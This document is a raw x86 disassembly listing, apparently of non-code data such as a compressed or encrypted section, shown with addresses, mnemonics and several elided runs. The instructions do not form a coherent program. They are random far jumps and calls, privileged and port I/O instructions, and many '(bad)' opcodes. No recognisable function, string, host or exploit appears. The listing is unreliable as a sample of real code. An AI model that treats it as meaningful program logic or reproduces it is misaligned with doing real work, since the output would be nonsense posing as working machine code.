  423090:	jmp    0xfa219a3
  423095:	sub    ecx,DWORD PTR [ebx+0x4e0744fa]
  42309b:	or     eax,0xe6e2749d
  4230a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4230a1:	gs push es
  4230a3:	sub    eax,0x1c2b45e1
  4230a8:	pop    ecx
  4230a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230aa:	sub    ah,BYTE PTR ds:0xc08b13f8
  4230b0:	jno    0x42307c
  4230b2:	call   0x5d75:0x95bc496c
  4230b9:	cwde   
  4230ba:	sub    ecx,ebx
  4230bc:	aaa    
  4230bd:	sub    al,0x71
  4230bf:	retf   
  4230c0:	ins    DWORD PTR es:[edi],dx
  4230c1:	cmp    ah,ch
  4230c3:	push   0x5a9469d7
  4230c8:	add    ebx,DWORD PTR [edx+0x4a3a252]
  4230ce:	sbb    esi,ebp
  4230d0:	test   edx,esp
  4230d2:	call   0xea6cc10b
  4230d7:	mov    ch,0x88
  4230d9:	mov    esi,edx
  4230db:	adc    BYTE PTR [ebx-0x1d21ba7c],0xea
  4230e2:	mov    cl,0x69
  4230e4:	int    0x79
  4230e6:	push   ecx
  4230e7:	loope  0x42311e
  4230e9:	fist   DWORD PTR [ecx-0x7c]
  4230ec:	fbstp  TBYTE PTR [edi-0x5a]
  4230ef:	add    DWORD PTR [ebx-0x1f],esi
  4230f2:	xchg   esp,eax
  4230f3:	bound  ebx,QWORD PTR [edx-0x9e4d8b2]
  4230f9:	push   ecx
  4230fa:	inc    esp
  4230fb:	loop   0x423104
  4230fd:	ds pusha 
  4230ff:	and    eax,0x1df8cf51
  423104:	jg     0x423125
  423106:	cli    
  423107:	stc    
  423108:	dec    eax
  423109:	fild   DWORD PTR [eax-0x48]
  42310c:	xchg   ebx,eax
  42310d:	popf   
  42310e:	mov    cl,0xc5
  423110:	sub    BYTE PTR [ecx+0x70214ad3],al
  423116:	dec    eax
  423117:	fisttp QWORD PTR ds:0xeaf05508
  42311d:	lock (bad) 
  42311f:	mov    cl,0xed
  423121:	add    eax,esp
  423123:	push   ebx
  423124:	adc    ebp,DWORD PTR [edi+0x72]
  423127:	jnp    0x42312a
  423129:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42312a:	nop
  42312b:	or     ch,BYTE PTR [ebx]
  42312d:	outs   dx,BYTE PTR ds:[esi]
  42312e:	mov    ds:0xcc7d0bb1,eax
  423133:	shl    DWORD PTR [eax-0x3d],1
  423136:	(bad)  
  423137:	and    eax,0xe2628630
  42313c:	test   BYTE PTR [esi+0x5f],cl
  42313f:	sub    eax,0x8cbead49
  423144:	int    0xaf
  423146:	shr    DWORD PTR [ebx+0x748717d2],cl
  42314c:	xchg   DWORD PTR [esi-0x58],ecx
  42314f:	push   ecx
  423150:	xchg   DWORD PTR [ecx+0x4d],edi
  423153:	repz fcmove st,st(0)
  423156:	and    esi,edx
  423158:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423159:	pop    eax
  42315a:	inc    ebx
  42315b:	cli    
  42315c:	mov    cl,0x3f
  42315e:	and    eax,DWORD PTR [ebx-0x15]
  423161:	dec    ecx
  423162:	lods   eax,DWORD PTR ds:[esi]
  423163:	fcom   QWORD PTR [ecx]
  423165:	xchg   edi,eax
  423166:	push   esp
  423167:	in     eax,dx
  423168:	jns    0x423148
  42316a:	sub    cl,bh
  42316c:	lods   eax,DWORD PTR ds:[esi]
  42316d:	lahf   
  42316e:	sub    BYTE PTR [ebp+ecx*4-0x79ab16b2],bl
  423175:	dec    edi
  423176:	pop    ecx
  423177:	and    DWORD PTR [edx-0x7b],edi
  42317a:	fild   WORD PTR [esi-0x2c]
  42317d:	popf   
  42317e:	sub    BYTE PTR [ebp+0x78],bl
  423181:	or     BYTE PTR [edx-0x56382819],dl
  423187:	nop
  423188:	adc    eax,0xa7bb3bd4
  42318d:	jns    0x42310f
  42318f:	dec    ebx
  423190:	mov    dl,0x0
	...
  4231f2:	add    BYTE PTR [eax],al
  4231f4:	jns    0x4231e7
  4231f6:	div    DWORD PTR [ecx-0x6804801]
  4231fc:	in     al,0xe0
  4231fe:	sub    DWORD PTR [edx-0x6d9f5988],esp
  423204:	push   es
  423205:	ja     0x423208
  423207:	add    BYTE PTR ds:0xc3000001,al
  42320d:	adc    eax,0x781a8b8e
  423212:	jecxz  0x423261
  423214:	out    0x89,al
  423216:	or     edi,edi
  423218:	mov    ds:0xa659541d,al
  42321d:	xchg   ecx,eax
  42321e:	in     al,dx
  42321f:	cs icebp 
  423221:	add    cl,BYTE PTR cs:[edi]
  423224:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423226:	jge    0x42324e
  423228:	sub    DWORD PTR [esi+0x18],ebx
  42322b:	add    bh,dl
  42322d:	push   ebp
  42322e:	add    al,0x83
  423230:	jmp    0xf5d1:0xe21f613d
  423237:	jbe    0x42326b
  423239:	(bad)  
  42323a:	jmp    0x8b81:0xe93ed873
  423241:	retf   0x6f52
  423244:	retf   0x8779
  423247:	sar    BYTE PTR fs:[ebp+0x378cbca2],0xa6
  42324f:	dec    edx
  423250:	jge    0x423230
  423252:	jmp    0xfd5e:0x3bc7b94b
  423259:	cmp    DWORD PTR [ecx-0x1c],0xa16b06d8
  423260:	mov    edx,0x7e8dc709
  423265:	mov    ah,0xea
  423267:	les    edi,FWORD PTR [ebp+0x1]
  42326a:	mov    ds:0xbbab5481,eax
  42326f:	dec    eax
  423270:	shl    ebx,cl
  423272:	ds pop es
  423274:	ror    BYTE PTR [esi+0x6cadc2b9],cl
  42327a:	xchg   esi,eax
  42327b:	adc    al,0xf9
  42327d:	popa   
  42327e:	pop    ecx
  42327f:	pop    ebp
  423280:	ror    BYTE PTR [edi],1
  423282:	popf   
  423283:	xchg   esi,eax
  423284:	push   0xee6e31e8
  423289:	ds push edi
  42328b:	lock cs pop eax
  42328e:	push   esp
  42328f:	hlt    
  423290:	adc    eax,0x91d9e3cd
  423295:	lods   al,BYTE PTR ds:[esi]
  423296:	lahf   
  423297:	aad    0xd3
  423299:	fchs   
  42329b:	dec    eax
  42329c:	les    ecx,FWORD PTR [esi+ecx*4-0x7c]
  4232a0:	(bad)  
  4232a1:	fld    TBYTE PTR [ebx+0x3f10edde]
  4232a7:	mov    ebx,0x7ae0104a
  4232ac:	(bad)  
  4232ad:	pop    ss
  4232ae:	xor    BYTE PTR [esi-0x8],0xb0
  4232b2:	fild   QWORD PTR [esi+0x5a]
  4232b5:	pushf  
  4232b6:	fmulp  st(1),st
  4232b8:	loopne 0x423332
  4232ba:	mov    al,0xc3
  4232bc:	cmp    edi,DWORD PTR [ecx+eiz*8+0x33ae836d]
  4232c3:	lock or eax,0xc7403984
  4232c9:	mov    ds:0x274b870a,al
  4232ce:	adc    ebx,DWORD PTR [esi]
  4232d0:	inc    esp
  4232d1:	nop
  4232d2:	xchg   edx,eax
  4232d3:	loop   0x423293
  4232d5:	pushf  
  4232d6:	push   0x22e79a6b
  4232db:	jmp    0x4c43:0xfa76b04c
  4232e2:	jns    0x423335
  4232e4:	mov    bl,0xbf
  4232e6:	dec    eax
  4232e7:	pop    edi
  4232e8:	loop   0x423275
  4232ea:	xchg   esp,eax
  4232eb:	addr16 pop ds
  4232ed:	rol    DWORD PTR [eax-0x73],1
  4232f0:	jecxz  0x42335c
  4232f2:	ins    DWORD PTR es:[edi],dx
  4232f3:	pop    ss
  4232f4:	xor    DWORD PTR [ebp+0x49],edi
  4232f7:	popf   
  4232f8:	je     0x4232d5
  4232fa:	cmp    esi,edi
  4232fc:	pop    esi
  4232fd:	sbb    ebx,DWORD PTR [ebx+0x79]
  423300:	icebp  
  423301:	inc    eax
  423302:	xor    BYTE PTR [esi-0x693685a2],ch
  423308:	add    ebp,DWORD PTR [edx-0x47]
  42330b:	jmp    0x28a815d5
  423310:	mov    eax,0x0
	...
  423371:	add    BYTE PTR [eax],al
  423373:	add    al,bh
  423375:	fisub  WORD PTR [edx+0x30]
  423378:	mov    sp,0xdefa
  42337c:	mov    eax,fs:0xd0420f44
  423382:	pop    DWORD PTR [edx+0x1780b]
  423388:	add    eax,0x9c000001
  42338d:	sar    DWORD PTR [edi],cl
  42338f:	shl    DWORD PTR [edi+0x5a659758],1
  423395:	fsubr  DWORD PTR [ecx-0x68d03f8e]
  42339b:	sbb    al,0x40
  42339d:	and    BYTE PTR [eax],0x52
  4233a0:	loop   0x423399
  4233a2:	mov    ah,0x1
  4233a4:	jns    0x423342
  4233a6:	fiadd  DWORD PTR [esi+0x7287a3b0]
  4233ac:	iret   
  4233ad:	xor    ebx,DWORD PTR [edx+0x561aaadb]
  4233b3:	jne    0x423395
  4233b5:	loop   0x4233e7
  4233b7:	out    dx,eax
  4233b8:	lea    ebp,[ebx]
  4233ba:	push   cs
  4233bb:	xor    DWORD PTR [edi+0x2335ee24],ecx
  4233c1:	cmp    al,BYTE PTR [eax]
  4233c3:	imul   edi
  4233c5:	mov    dh,BYTE PTR [esp+edx*8-0x5a832f46]
  4233cc:	xor    esi,DWORD PTR [esi]
  4233ce:	rcl    DWORD PTR [eax+0x30],1
  4233d1:	dec    esi
  4233d2:	(bad)  
  4233d4:	(bad)  
  4233d5:	enter  0x20fe,0x7b
  4233d9:	sahf   
  4233da:	dec    edx
  4233db:	push   edx
  4233dc:	mov    bh,0x35
  4233de:	mov    DWORD PTR [ecx+0x8062ad],edi
  4233e4:	dec    edx
  4233e5:	push   esp
  4233e6:	out    dx,al
  4233e7:	and    DWORD PTR [edx+ecx*4+0x15c04ef0],esi
  4233ee:	test   al,0xbd
  4233f0:	aad    0x90
  4233f2:	nop
  4233f3:	out    dx,eax
  4233f4:	test   al,0x9e
  4233f6:	mov    WORD PTR [ebx],ds
  4233f8:	dec    ebp
  4233f9:	cmp    BYTE PTR [ebp+eiz*8-0x43],dl
  4233fd:	out    dx,al
  4233fe:	inc    edi
  4233ff:	and    al,0x3d
  423401:	sbb    al,0xfe
  423403:	jnp    0x423447
  423405:	cmp    DWORD PTR [edi+0x28edfa47],0x69
  42340c:	ror    BYTE PTR [edi+0xf],cl
  42340f:	jbe    0x42339a
  423411:	add    eax,0x71e567c7
  423416:	enter  0x57fc,0x7d
  42341a:	add    al,0x7c
  42341c:	mov    ah,0x81
  42341e:	(bad)  
  42341f:	cmp    ebp,ebx
  423421:	hlt    
  423422:	sub    edi,DWORD PTR [esi-0x4e6cd5ec]
  423428:	lea    esp,[esi]
  42342a:	sbb    esi,ebp
  42342c:	ss and edx,0xffffffd5
  423430:	cmp    eax,0x5c95cdc0
  423435:	xchg   ecx,eax
  423436:	pop    ecx
  423437:	pop    es
  423438:	jmp    0x9f0979c9
  42343d:	nop
  42343e:	icebp  
  42343f:	imul   ecx,DWORD PTR ds:[ebx-0x4c],0xbaac0708
  423447:	or     ebx,ebx
  423449:	adc    DWORD PTR [ebx+0x374d8364],esp
  42344f:	mov    ah,0xcd
  423451:	cmp    cl,BYTE PTR [ebx-0x628742a1]
  423457:	pop    eax
  423458:	pop    ebp
  423459:	sub    esi,edx
  42345b:	pop    esp
  42345c:	or     ecx,DWORD PTR [ebp+0x24]
  42345f:	add    dl,BYTE PTR [ebx-0x15]
  423462:	sub    eax,DWORD PTR [ebp-0x30]
  423465:	mov    ch,0xfe
  423467:	mov    esi,0x9894dd88
  42346c:	pop    esi
  42346d:	out    0x1a,eax
  42346f:	mov    edx,0x6ec748f3
  423474:	sub    edi,edi
  423476:	and    al,0xdb
  423478:	out    dx,eax
  423479:	lock or al,0x64
  42347c:	loope  0x423476
  42347e:	add    ch,BYTE PTR [edx]
  423480:	cmp    eax,0xb345183a
  423485:	xchg   edx,eax
  423486:	xchg   ecx,eax
  423487:	xchg   ebp,eax
  423488:	inc    ebx
  423489:	rcr    eax,0x6e
  42348c:	sbb    eax,0xf92afc6a
	...
  4234f1:	add    BYTE PTR [eax],al
  4234f3:	add    al,al
  4234f5:	mov    al,0x45
  4234f7:	outs   dx,DWORD PTR ds:[esi]
  4234f8:	jne    0x4234f9
  4234fa:	jmp    0x481f:0xadf467bf
  423501:	jb     0x42354f
  423503:	sub    edx,DWORD PTR [eax]
  423505:	jns    0x423508
  423507:	add    BYTE PTR ds:0xdc000001,al
  42350d:	aad    0xad
  42350f:	jmp    0x874173c6
  423514:	pop    esi
  423515:	pop    ss
  423516:	das    
  423517:	lock xchg ecx,eax
  423519:	push   edx
  42351a:	in     al,dx
  42351b:	push   ss
  42351c:	retf   0xd449
  42351f:	mov    al,ds:0xe65250e5
  423524:	push   esi
  423525:	mov    ah,0x6c
  423527:	in     al,0x9f
  423529:	sbb    esi,eax
  42352b:	inc    esi
  42352c:	inc    ebx
  42352d:	pop    es
  42352e:	clc    
  42352f:	ror    ebp,cl
  423531:	jle    0x423508
  423533:	aas    
  423534:	lea    edi,[esi]
  423536:	jle    0x4234d7
  423538:	sar    BYTE PTR [edi+0x51],cl
  42353b:	xlat   BYTE PTR ds:[ebx]
  42353c:	test   eax,0x7f660cbf
  423541:	pop    esi
  423542:	ja     0x423502
  423544:	push   cs
  423545:	out    dx,eax
  423546:	pop    eax
  423547:	fnstsw WORD PTR [eax-0x3693afdc]
  42354d:	mov    edi,0x98f74483
  423552:	mov    DWORD PTR [edi],0x2f3f5c8d
  423558:	dec    DWORD PTR ds:0x53460f07
  42355e:	sub    ecx,DWORD PTR [edx-0x6f]
  423561:	and    DWORD PTR [ecx+0x14],0x19
  423565:	xor    DWORD PTR [ebx-0xa],esp
  423568:	lock or al,0x9
  42356b:	mov    ecx,0x5d9a31ad
  423570:	inc    ebp
  423571:	ret    
  423572:	xor    eax,0x2aa9d908
  423577:	gs call 0xa79ba7df
  42357d:	adc    DWORD PTR [ebx],esp
  42357f:	cld    
  423580:	xchg   edx,eax
  423581:	test   al,0x2b
  423583:	mov    ah,0xc3
  423585:	(bad)  [ecx+0x76901042]
  42358b:	nop
  42358c:	mov    bl,dh
  42358e:	in     eax,0x54
  423590:	jb     0x42356d
  423592:	bt     DWORD PTR ds:0xed3afa70,esp
  423599:	and    cl,BYTE PTR [ebp-0x2c40ca55]
  42359f:	and    ebp,DWORD PTR [ecx+0x769cda24]
  4235a5:	push   ss
  4235a6:	out    0x8a,al
  4235a8:	ret    0x91e5
  4235ab:	inc    ebp
  4235ac:	enter  0x8a3f,0xf5
  4235b0:	popa   
  4235b1:	and    eax,0xb1d537d
  4235b6:	xchg   ebx,eax
  4235b7:	xchg   esi,eax
  4235b8:	pushf  
  4235b9:	xlat   BYTE PTR ds:[ebx]
  4235ba:	dec    edx
  4235bb:	rcl    DWORD PTR [eax-0x1],0x68
  4235bf:	pop    esp
  4235c0:	add    ebp,DWORD PTR [edi-0x1d]
  4235c3:	mov    al,ds:0x3e6a5d80
  4235c8:	push   ebx
  4235c9:	add    dh,bh
  4235cb:	pop    edi
  4235cc:	loop   0x423594
  4235ce:	fdiv   QWORD PTR [esi-0xbaf828c]
  4235d4:	(bad)  
  4235d5:	int    0x2b
  4235d7:	shl    DWORD PTR [edi+0x1fb91823],cl
  4235dd:	jle    0x42359a
  4235df:	fwait
  4235e0:	xchg   ecx,eax
  4235e1:	inc    edi
  4235e2:	pop    esi
  4235e3:	pop    ds
  4235e4:	sub    ah,BYTE PTR ds:0xceba929f
  4235ea:	jle    0x4235a1
  4235ec:	jg     0x42359e
  4235ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4235ef:	push   esi
  4235f0:	sahf   
  4235f1:	jg     0x423575
  4235f3:	xor    al,0xd0
  4235f5:	sub    dl,0xd1
  4235f8:	das    
  4235f9:	aad    0xb3
  4235fb:	and    DWORD PTR [ebx-0x7c],0xffffff8b
  4235ff:	int3   
  423600:	jg     0x4235ca
  423602:	lods   eax,DWORD PTR ds:[esi]
  423603:	mov    ebx,db6
  423606:	mul    BYTE PTR [edi+0x28d86c7b]
  42360c:	aaa    
  42360d:	mov    al,0x84
  42360f:	jo     0x4235ac
	...
  423671:	add    BYTE PTR [eax],al
  423673:	add    BYTE PTR [eax+0x7f747c8f],al
  423679:	test   DWORD PTR [eax+0x7c916eff],0xb1042d13
  423683:	cmp    eax,0x17a15
  423688:	add    eax,0xf2000001
  42368d:	xchg   ebp,eax
  42368e:	js     0x4236c2
  423690:	or     DWORD PTR [esp+ebx*1],edx
  423693:	xor    al,0x7
  423695:	leave  
  423696:	mov    ds:0xd85d76f0,al
  42369b:	dec    ebx
  42369c:	jns    0x4236be
  42369e:	dec    ecx
  42369f:	jb     0x423654
  4236a1:	shl    DWORD PTR [eax+0x3390ae3e],0x14
  4236a8:	adc    eax,0xec138743
  4236ad:	nop
  4236ae:	push   ebx
  4236af:	and    eax,0x4f487c64
  4236b4:	jge    0x4236d9
  4236b6:	push   ds
  4236b7:	add    DWORD PTR ds:0xb7f3e7f1,edi
  4236bd:	je     0x42367b
  4236bf:	push   ds
  4236c0:	cmp    eax,0x942dd95e
  4236c5:	sbb    dl,BYTE PTR [edi+0x40]
  4236c8:	jo     0x42371c
  4236ca:	dec    ebp
  4236cb:	cmp    BYTE PTR [ebx-0x3bbf0b08],dh
  4236d1:	cwde   
  4236d2:	xor    bl,dh
  4236d4:	jo     0x4236a2
  4236d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4236d7:	popf   
  4236d8:	(bad)  
  4236da:	lock pop esp
  4236dc:	mov    dh,0x26
  4236de:	push   esi
  4236df:	jp     0x42372d
  4236e1:	add    eax,0xf4b0142f
  4236e6:	icebp  
  4236e7:	mov    eax,0x6d707422
  4236ec:	jb     0x42367a
  4236ee:	mov    ebp,DWORD PTR [ecx+0x2a]
  4236f1:	jecxz  0x4236f0
  4236f3:	and    DWORD PTR [edi],ebx
  4236f5:	inc    edi
  4236f6:	fild   WORD PTR ss:[ebx-0x9]
  4236fa:	push   cs
  4236fb:	stos   BYTE PTR es:[edi],al
  4236fc:	je     0x423730
  4236fe:	mov    ebp,0xabfcf56a
  423703:	mov    al,ds:0x80002028
  423708:	popf   
  423709:	sbb    eax,0xbfc94eb9
  42370e:	loopne 0x423753
  423710:	or     bl,BYTE PTR [esi]
  423712:	mov    ah,0x67
  423714:	test   al,0x7d
  423716:	dec    edi
  423717:	aad    0xa1
  423719:	pop    edi
  42371a:	scas   al,BYTE PTR es:[edi]
  42371b:	lock mov ds:0xdf0cb4a7,eax
  423721:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423722:	adc    ah,BYTE PTR [ebx]
  423724:	add    BYTE PTR [edi],cl
  423726:	shr    DWORD PTR [esi+ebx*4-0x71e438c2],1
  42372d:	adc    DWORD PTR [eax+0xf],esp
  423730:	popf   
  423731:	mul    BYTE PTR [esi]
  423733:	cmp    BYTE PTR [ebx-0x2f],dl
  423736:	sbb    dh,BYTE PTR [ebx-0x16]
  423739:	in     eax,dx
  42373a:	out    dx,al
  42373b:	(bad)  
  42373c:	cmp    ch,BYTE PTR [eax-0xe]
  42373f:	push   ss
  423740:	arpl   sp,si
  423742:	shr    esi,1
  423744:	imul   eax,DWORD PTR [eax+0x2b2ea2ab],0x16
  42374b:	int3   
  42374c:	lock pop edi
  42374e:	sbb    DWORD PTR [ebx],ecx
  423750:	mov    bl,0xfe
  423752:	push   ss
  423753:	cmc    
  423754:	inc    ebx
  423755:	aam    0x7a
  423757:	or     eax,0x620644f3
  42375c:	and    esi,DWORD PTR [edx-0x6cc6706f]
  423762:	ins    DWORD PTR es:[edi],dx
  423763:	fs call 0x563a0c28
  423769:	imul   esi,DWORD PTR [ecx-0x16],0xfffffff3
  42376d:	int3   
  42376e:	fwait
  42376f:	mov    esi,0x8d3da7f9
  423774:	push   ss
  423775:	cmp    al,0xde
  423777:	mov    esi,edx
  423779:	jns    0x423723
  42377b:	xchg   DWORD PTR [edx],esi
  42377d:	repz dec ebx
  42377f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423780:	pop    edx
  423781:	mov    edi,0xa60db2f4
  423786:	out    dx,al
  423787:	push   ecx
  423788:	retf   
  423789:	xchg   esp,eax
  42378a:	fsubrp st(4),st
  42378c:	xchg   ebp,eax
  42378d:	repnz std 
  42378f:	mov    bh,0x35
	...
  4237f1:	add    BYTE PTR [eax],al
  4237f3:	add    BYTE PTR [ebx+eiz*1],dh
  4237f6:	jo     0x423795
  4237f8:	ja     0x4237d9
  4237fa:	std    
  4237fb:	stos   DWORD PTR es:[edi],eax
  4237fc:	(bad)  
  4237fd:	sbb    edx,esi
  4237ff:	jmp    0x7b1a:0x3ffa0e6a
  423806:	add    DWORD PTR [eax],eax
  423808:	add    eax,0x45000001
  42380d:	mov    edx,0x7c5e4875
  423812:	(bad)  
  423813:	pop    ebx
  423814:	fld    TBYTE PTR es:[esi]
  423817:	pop    ss
  423818:	inc    ebx
  423819:	jl     0x423877
  42381b:	inc    edi
  42381c:	(bad)  
  42381d:	clc    
  42381e:	lods   eax,DWORD PTR ds:[esi]
  42381f:	mov    ah,0x66
  423821:	jle    0x4237a6
  423823:	add    bl,bh
  423825:	pop    ss
  423826:	xchg   ecx,eax
  423827:	call   0x3351:0xb20a6bab
  42382e:	mov    al,0x3e
  423830:	call   0xf443:0xfff56f99
  423837:	xchg   esi,eax
  423838:	push   es
  423839:	std    
  42383a:	enter  0xa2df,0x75
  42383e:	mov    ds:0xa1869b17,al
  423843:	push   0xeee31420
  423848:	xchg   ebx,eax
  423849:	xor    BYTE PTR [esi+0x7516c94a],dl
  42384f:	scas   al,BYTE PTR es:[edi]
  423850:	push   es
  423851:	inc    eax
  423852:	push   cs
  423853:	xor    al,0xe9
  423855:	inc    DWORD PTR [eax-0x3b]
  423858:	retf   0xf2ae
  42385b:	jnp    0x4238a6
  42385d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42385e:	rcl    DWORD PTR [edi],0xe1
  423861:	xchg   edx,eax
  423862:	pushf  
  423863:	and    DWORD PTR [ebx+0x4c],0xde78ef27
  42386a:	mov    ds:0x6585cd32,al
  42386f:	cwde   
  423870:	sub    DWORD PTR [esi+0x57e0d36f],ebp
  423876:	adc    DWORD PTR [edx],0x60
  423879:	and    eax,0x1f20094c
  42387e:	jae    0x423821
  423880:	push   ss
  423881:	or     edx,DWORD PTR [ecx-0x3]
  423884:	xchg   edi,eax
  423885:	and    BYTE PTR [esp+eax*1-0x25513acd],bh
  42388c:	push   ds
  42388d:	xlat   BYTE PTR ds:[ebx]
  42388e:	xchg   DWORD PTR [edx],ecx
  423890:	sahf   
  423891:	xchg   edx,eax
  423892:	mov    ds:0xf3b2af72,eax
  423897:	(bad)  
  423898:	adc    BYTE PTR [ebx+0x3],dh
  42389b:	xchg   DWORD PTR [edi],esi
  42389d:	in     al,dx
  42389e:	fild   WORD PTR [ecx-0x4bfb97ab]
  4238a4:	sar    DWORD PTR [ebp-0x1bab7de6],0x6
  4238ab:	nop
  4238ac:	cmp    eax,0x149ed1cb
  4238b1:	je     0x423917
  4238b3:	inc    esp
  4238b4:	xchg   ecx,eax
  4238b5:	popa   
  4238b6:	cs jp  0x4238fe
  4238b9:	inc    ebp
  4238ba:	loop   0x42388c
  4238bc:	inc    ecx
  4238bd:	shr    DWORD PTR [edi+eax*4+0x229d0238],1
  4238c4:	add    al,0xb2
  4238c6:	pop    eax
  4238c7:	loop   0x423913
  4238c9:	xor    al,dh
  4238cb:	or     ebx,ecx
  4238cd:	fidivr WORD PTR [edx+0x76]
  4238d0:	xor    DWORD PTR [edi+ebp*8-0x20],0x678ed28f
  4238d8:	push   edi
  4238d9:	in     al,0x6c
  4238db:	and    al,BYTE PTR [ebp+0x10bda4c8]
  4238e1:	or     BYTE PTR [ebp-0x2c69439b],al
  4238e7:	sub    DWORD PTR [edi-0x11336e0b],ecx
  4238ed:	jmp    0x4238a6
  4238ef:	pop    edx
  4238f0:	xchg   ebx,eax
  4238f1:	jmp    0x8a35:0x927b1d2f
  4238f8:	aaa    
  4238f9:	jp     0x4238d4
  4238fb:	pop    ecx
  4238fc:	test   DWORD PTR [ecx+0x4b],edi
  4238ff:	mov    ebp,0x9c77b956
  423904:	jae    0x4238fd
  423906:	mov    eax,0x962f4880
  42390b:	sahf   
  42390c:	sbb    ah,al
  42390e:	dec    ebp
  42390f:	adc    eax,0xb3
	...
  423974:	mov    ah,BYTE PTR [ecx+esi*8-0x4220078]
  42397b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42397c:	push   ecx
  42397d:	sbb    eax,0x6b102bbd
  423982:	into   
  423983:	rcr    BYTE PTR [edi],0x7c
  423986:	add    DWORD PTR [eax],eax
  423988:	add    eax,0xa1000001
  42398d:	sbb    ch,BYTE PTR [edi]
  42398f:	pop    esp
  423990:	data16 mov ch,0x87
  423993:	sbb    eax,0x9548b425
  423998:	cmc    
  423999:	push   0x2adac19
  42399e:	fs xchg esp,eax
  4239a0:	inc    ecx
  4239a1:	(bad)
  4239a5:	mov    ds:0xca9fbc1e,eax
  4239aa:	xor    DWORD PTR [edx],eax
  4239ac:	sbb    BYTE PTR [ebx-0x80],0xd2
  4239b0:	and    eax,0xdf4d5ead
  4239b5:	je     0x423991
  4239b7:	nop
  4239b8:	rcr    dl,0x9b
  4239bb:	xchg   BYTE PTR ss:0xc6cdd806,bl
  4239c2:	pop    es
  4239c3:	xor    eax,0x35173547
  4239c8:	int3   
  4239c9:	dec    edi
  4239ca:	pop    edx
  4239cb:	popf   
  4239cc:	push   es
  4239cd:	push   es
  4239ce:	lods   eax,DWORD PTR ds:[esi]
  4239cf:	mov    dh,0x96
  4239d1:	aam    0xdd
  4239d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4239d4:	call   0xe9d1a97b
  4239d9:	adc    esi,DWORD PTR [edi+0x6e58fec9]
  4239df:	out    dx,eax
  4239e0:	xchg   ebx,eax
  4239e1:	push   ds
  4239e2:	sbb    al,0xf6
  4239e4:	clc    
  4239e5:	add    BYTE PTR [esi],0xc7
  4239e8:	shl    edx,1
  4239ea:	or     ebp,0xa5bd8ec1
  4239f0:	ret    
  4239f1:	jns    0x423a27
  4239f3:	mov    al,0x42
  4239f5:	add    eax,0x29212b86
  4239fa:	cmp    al,0x97
  4239fc:	ret    
  4239fd:	fcomp  QWORD PTR ds:0x217c410f
  423a03:	sahf   
  423a04:	xchg   edi,eax
  423a05:	adc    BYTE PTR [ebx+0x72],dh
  423a08:	ficomp DWORD PTR [ebp-0x38ad83ae]
  423a0e:	cli    
  423a0f:	or     DWORD PTR [ebx-0x5c90d14e],edi
  423a15:	push   eax
  423a16:	mov    bh,0xac
  423a18:	nop
  423a19:	in     al,0x82
  423a1b:	loopne 0x423a22
  423a1d:	cli    
  423a1e:	pushf  
  423a1f:	test   DWORD PTR [ebp-0x77131b22],0x1187220e
  423a29:	pop    ds
  423a2a:	enter  0x1235,0x5a
  423a2e:	sbb    al,0x36
  423a30:	inc    esp
  423a31:	aaa    
  423a32:	outs   dx,DWORD PTR ds:[esi]
  423a33:	ja     0x423a72
  423a35:	(bad)  
  423a36:	cmp    DWORD PTR [esi],edi
  423a38:	jecxz  0x423a26
  423a3a:	dec    eax
  423a3b:	xor    al,0x6
  423a3d:	out    0xfc,al
  423a3f:	xchg   edx,eax
  423a40:	test   eax,0x1d663a6f
  423a45:	xlat   BYTE PTR ds:[ebx]
  423a46:	cmp    eax,0xdd4946ba
  423a4b:	fmul   DWORD PTR [ecx-0x3]
  423a4e:	sbb    BYTE PTR [esi],0x69
  423a51:	in     al,dx
  423a52:	mov    eax,ds:0xa08627d2
  423a57:	inc    esi
  423a58:	mov    bh,0x7a
  423a5a:	or     DWORD PTR [esi],edx
  423a5c:	inc    eax
  423a5d:	daa    
  423a5e:	test   al,0x7f
  423a60:	sub    eax,0x315484f6
  423a65:	pusha  
  423a66:	pop    ecx
  423a67:	xchg   ebx,eax
  423a68:	and    DWORD PTR [ecx],esp
  423a6a:	fidivr WORD PTR [eax+ebp*2]
  423a6d:	dec    BYTE PTR [esp+ebp*8-0x6921d51b]
  423a74:	add    cl,BYTE PTR [esi]
  423a76:	inc    edx
  423a77:	fs jle 0x423ac5
  423a7a:	inc    ebp
  423a7b:	mov    bh,0x5
  423a7d:	mov    dh,0x70
  423a7f:	(bad)  
  423a80:	outs   dx,DWORD PTR ds:[esi]
  423a81:	retf   0x5f94
  423a84:	out    0xfd,al
  423a86:	lods   eax,DWORD PTR ds:[esi]
  423a87:	dec    edx
  423a88:	repnz push eax
  423a8a:	xor    al,0x7e
  423a8c:	xor    bl,BYTE PTR [esi+0x6a]
  423a8f:	inc    edi
  423a90:	pop    es
	...
  423af1:	add    BYTE PTR [eax],al
  423af3:	add    BYTE PTR [eax],dh
  423af5:	cmp    eax,0xdf7d9f75
  423afa:	cli    
  423afb:	mov    edi,0x60851ed8
  423b00:	push   esi
  423b01:	adc    cl,cl
  423b03:	or     esp,DWORD PTR [edi*2+0x1050001]
  423b0a:	add    BYTE PTR [eax],al
  423b0c:	xlat   BYTE PTR ds:[ebx]
  423b0d:	mov    dh,cl
  423b0f:	ficomp DWORD PTR ds:0x1f02f959
  423b15:	(bad)  
  423b16:	fimul  WORD PTR [esi]
  423b18:	or     al,BYTE PTR [edi+0x45d59c4a]
  423b1e:	cmp    bh,dl
  423b20:	ds call 0xb331:0x792235ff
  423b28:	adc    eax,0x47becd4
  423b2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b2e:	jo     0x423ba5
  423b30:	bound  ebp,QWORD PTR [edx+0x35]
  423b33:	inc    eax
  423b34:	pop    edi
  423b35:	sub    eax,0x3ffcf9d2
  423b3a:	or     BYTE PTR [edi],al
  423b3c:	pop    edi
  423b3d:	push   esp
  423b3e:	test   DWORD PTR [esi-0x8fb79ec],esi
